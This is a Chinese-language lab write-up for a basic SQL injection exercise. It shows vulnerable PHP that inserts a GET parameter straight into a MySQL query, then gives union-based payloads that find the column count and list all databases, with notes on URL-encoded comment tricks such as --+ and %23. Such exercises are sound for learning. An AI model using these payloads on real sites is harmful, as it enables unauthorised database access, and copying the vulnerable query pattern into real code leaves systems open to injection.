核心代码：

$sql = "SELECT * FROM users where name='";
        $sql .= $_GET["name"]."'";
        $result = mysql_query($sql);
        if ($result) {
                ?>
                <table class='table table-striped'>
      <tr><th>id</th><th>name</th><th>age</th></tr>
                <?php
                while ($row = mysql_fetch_assoc($result)) {
                        echo "<tr>";
                        echo "<td>".$row['id']."</td>";
                        echo "<td>".$row['name']."</td>";
                        echo "<td>".$row['age']."</td>";
                        echo "</tr>";
                }
                echo "</table>";
        }

题目详解：

  • 请求方式为： GET

  • 闭合方式为： name=' root'

  • payload：

    example1.php?name=root' order by 5 
#获取字段长度为5
example1.php?name=root' union select 1,2,(select group_concat(schema_name) from information_schema.schemata),4,5--+
#获取全部数据库

拓展知识：

  • MySQL注释符为 # 和 -- ，在此题中无法直接使用，查找资料得知：

    1. # 被url编码为空所以无法使用，改为 %23 即可

      ![Untitled](C:\Users\Administrator\Desktop\example1 2fcd5232609d4faba0d17cce3151c7dc\Untitled.png)

    2. 直接使用 -- 和后面的 ' 连接在一起无法形成有效MySQL语句，通过如下分析：

      ![Untitled](C:\Users\Administrator\Desktop\example1 2fcd5232609d4faba0d17cce3151c7dc\Untitled 1.png)

      ![Untitled](C:\Users\Administrator\Desktop\example1 2fcd5232609d4faba0d17cce3151c7dc\Untitled 2.png)

      分析得知直接使用 -- 无法闭合，解决方法为添加 + ，跟 # 一样的原理，添加 + 会被url编码为空格，用来和后面的单引号分隔开，将后面的语句注释掉。如下进行分析：

      先在题目代码中添加一行输出，使其能回显我们的输入和SQL语句

      ![Untitled](C:\Users\Administrator\Desktop\example1 2fcd5232609d4faba0d17cce3151c7dc\Untitled 3.png)

      然后我们输入 --+ 进行注释，可以看到 + 被编码为空格并成功执行SQL

      ![Untitled](C:\Users\Administrator\Desktop\example1 2fcd5232609d4faba0d17cce3151c7dc\Untitled 4.png)

      根据其原理，我们还可以直接使用 --' 进行注释，同样可成功执行SQL

      ![Untitled](C:\Users\Administrator\Desktop\example1 2fcd5232609d4faba0d17cce3151c7dc\Untitled 5.png)

      我们也可以让 + 不被编码，改为 %2b 即可，当然SQL语句也不能成功执行
